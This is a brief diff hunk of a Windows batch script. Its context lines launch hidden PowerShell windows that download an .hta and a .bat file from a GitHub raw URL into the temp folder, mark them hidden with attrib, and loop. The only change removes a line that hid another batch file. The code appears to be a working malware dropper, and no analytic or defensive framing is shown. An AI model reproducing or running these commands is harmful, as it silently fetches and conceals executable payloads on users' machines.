@@ -2,7 +2,7 @@
 timeout /t 1 & 
 powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta -Outfile %tmp%/mathew.hta
 powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mat.bat -Outfile %tmp%/mat.bat
-cmd /c attrib +h %tmp%/go.bat 
+
 cmd /c attrib +h %tmp%/mathew.hta
 cmd /c attrib +h %tmp%/mat.bat 
 goto top1 
